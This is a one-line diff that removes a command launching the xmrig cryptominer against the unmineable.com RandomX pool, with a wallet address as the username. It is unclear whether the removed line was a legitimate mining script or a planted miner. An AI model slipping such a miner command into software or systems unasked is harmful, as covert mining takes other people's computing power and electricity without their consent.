@@ -1,1 +1,0 @@
-xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u RSR:0x4ce2ad94e915de0eb43cc2f0753f3017c3bb2cf3.BİNANCE -p x pause 
